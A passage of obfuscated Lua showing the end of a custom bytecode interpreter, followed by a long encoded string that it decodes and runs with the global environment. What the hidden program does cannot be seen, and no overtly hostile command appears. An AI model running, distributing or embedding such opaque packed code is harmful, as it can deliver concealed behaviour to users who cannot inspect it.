                            local cu = aI(c8[1448336135], 46)
                            local cv = cn
                            local cO, cP
                            local cE
                            local cQ = 0
                            cO = {}
                            if cu ~= 1 then
                                if cu ~= 0 then
                                    cE = ct + cu - 1
                                else
                                    cE = ch
                                end
                                for c5 = ct + 1, cE do
                                    cO[#cO + 1] = cv[c5]
                                end
                                cP = {cv[ct](unpack(cO, 1, cE - ct))}
                            else
                                cP = {cv[ct]()}
                            end
                            for cM in next, cP do
                                if cM > cQ then
                                    cQ = cM
                                end
                            end
                            return cP, cQ
                        elseif cs == 176 then
                            local cv = cn
                            local cu = aI(aI(c8[1448336135], 32), ck)
                            local cR = cv[cu]
                            for c5 = cu + 1, aI(aK(c8[944577840], 109, 512), ck) do
                                cR = cR .. cv[c5]
                            end
                            cn[aK(aI(c8[662764126], 47), ck, 256)] = cR
                        elseif cs == 187 then
                            if
                                not (not cn[aL(aI(c8[662764126], 14), ck, 256)]) ==
                                    (aL(aK(c8[944577840], 83, 512), ck, 512) == 0)
                             then
                                cg = cg + 1
                            end
                        elseif cs == 243 then
                            if aL(c8[1588048608], 93477, 262144) == 2893 then
                                cn[aK(c8[662764126], 85, 256)] = b0
                            else
                                cn[aK(c8[662764126], 85, 256)] = aZ[aL(c8[1588048608], 93477, 262144)]
                            end
                        elseif cs == 83 then
                            ce[c2[aL(c8[1588048608], 173385, 262144)]] = cn[aL(c8[662764126], 37, 256)]
                        elseif cs == 206 then
                            cn[aI(aL(c8[662764126], 94, 256), ck)] =
                                c2[aK(aL(c8[1588048608], 188530, 262144), ck, 262144)]
                        elseif cs == 99 then
                            local cu = aK(c8[1448336135], 71, 512)
                            local b_ = aK(aL(c8[944577840], 118, 512), ck, 512)
                            local cv = cn
                            if cu > 255 then
                                cu = c2[cu - 256]
                            else
                                cu = cv[cu]
                            end
                            if b_ > 255 then
                                b_ = c2[b_ - 256]
                            else
                                b_ = cv[b_]
                            end
                            cv[aK(c8[662764126], 99, 256)] = cu - b_
                        elseif cs == 127 then
                            local ct = aK(c8[662764126], 80, 256)
                            local cv = cn
                            cv[ct] = assert(tonumber(cv[ct]), "`for` initial value must be a number")
                            cv[ct + 1] = assert(tonumber(cv[ct + 1]), "`for` limit must be a number")
                            cv[ct + 2] = assert(tonumber(cv[ct + 2]), "`for` step must be a number")
                            cv[ct] = cv[ct] - cv[ct + 2]
                            cg = cg + c8[1457547185]
                        elseif cs == 171 then
                            local ct = aK(c8[662764126], 84, 256)
                            local cu = aK(c8[1448336135], 92, 512)
                            local b_ = aI(c8[944577840], 75)
                            local cv = cn
                            local cO, cP
                            local cE, cC
                            cO = {}
                            if cu ~= 1 then
                                if cu ~= 0 then
                                    cE = ct + cu - 1
                                else
                                    cE = ch
                                end
                                cC = 0
                                for c5 = ct + 1, cE do
                                    cC = cC + 1
                                    cO[cC] = cv[c5]
                                end
                                cE, cP = cc(cv[ct](unpack(cO, 1, cE - ct)))
                            else
                                cE, cP = cc(cv[ct]())
                            end
                            ch = ct - 1
                            if b_ ~= 1 then
                                if b_ ~= 0 then
                                    cE = ct + b_ - 2
                                else
                                    cE = cE + ct - 1
                                end
                                cC = 0
                                for c5 = ct, cE do
                                    cC = cC + 1
                                    cv[c5] = cP[cC]
                                end
                            end
                        end
                    end
                end
                local cO = {...}
                for c5 = 0, cj do
                    if c5 >= c4[115077684] then
                        ci[c5 - c4[115077684]] = cO[c5 + 1]
                    else
                        cn[c5] = cO[c5 + 1]
                    end
                end
                local cu, b_ = cr()
                if cu and b_ > 0 then
                    return unpack(cu, 1, b_)
                end
                return
            end
        end
        local function cS(cT, ce)
            local cU = bz(cT)
            return cd(cU, ce or getfenv(0)), cU
        end
        return cS(
            ba(
                "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